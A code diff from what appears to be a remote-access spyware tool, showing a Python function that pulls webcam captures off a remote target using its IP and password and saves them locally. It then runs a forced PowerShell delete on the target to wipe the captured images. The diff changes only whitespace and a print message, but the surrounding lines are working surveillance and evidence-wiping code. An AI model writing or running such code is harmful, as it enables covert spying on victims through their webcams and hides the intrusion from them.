@@ -204,13 +204,14 @@ def fetch_camcapture(ipv4,pword,temp_dir,uname):
     camcap_folder = f"camcap-{uname}-{get_current_date()}"
     print("[+] Downloading all cam captures...")
     remote_download(ipv4,pword,f"{temp_dir}/QKlYTmHhCDy")
-
     print("[*] Downloaded all cam captures...")
+
     print("[+] Saving....")
     os.system(f"mkdir ~/Downloads/{camcap_folder}")
     os.system(f"mv ~/Downloads/QKlYTmHhCDy/* ~/Downloads/{camcap_folder}")
     os.system("rm -rf ~/Downloads/QKlYTmHhCDy")
-    print(f"[*] Saved to \"~/Downloads/{camcap_folder}\"")
+    print(f"[*] Saved at \"~/Downloads/{camcap_folder}\" folder")
+    
     print("[+] Deleting all captures from remote target....")
     remote_command(ipv4,pword, f"powershell remove-item -path {temp_dir}/QKlYTmHhCDy/*.bmp -force -recurse")
     print("[*] Success. Wiped all captures...")
